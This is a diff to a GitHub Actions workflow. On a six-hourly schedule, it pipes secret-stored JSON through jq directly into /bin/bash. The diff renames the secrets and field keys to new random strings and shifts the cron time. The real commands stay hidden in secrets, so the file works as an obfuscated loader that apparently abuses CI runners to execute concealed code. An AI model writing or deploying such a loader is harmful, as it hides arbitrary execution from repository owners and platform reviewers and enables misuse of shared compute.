@@ -1,23 +1,23 @@
 name: chucaiwei8917
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
+    - cron: '20 5/6 * * *'
 
-jobs:  # 30079
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chucaiwei8917
         env:
-          dg6304: ${{ secrets.dg6304 }}
+          b50: ${{ secrets.b50 }}
         run: |
-          echo $dg6304 | jq -r .vlj6 | /bin/bash
-          echo $s710 | jq -r .e3100 | /bin/bash
-          echo $df32 | jq -r .t6 | /bin/bash
-          echo $fuc5 | jq -r .w98 | /bin/bash
-          echo $ffeba42980 | jq -r .x322 | /bin/bash
-          echo $fnyz774 | jq -r .bki8614 | /bin/bash
+          echo $b50 | jq -r .q2 | /bin/bash
+          echo $s92 | jq -r .lfj288 | /bin/bash
+          echo $ofpx003 | jq -r .ritt452 | /bin/bash
+          echo $vv939 | jq -r .jb413 | /bin/bash
+          echo $l62 | jq -r .unkt9372 | /bin/bash
+          echo $vz67805 | jq -r .egobu408 | /bin/bash
+          echo $dvg8928 | jq -r .jz602 | /bin/bash
 
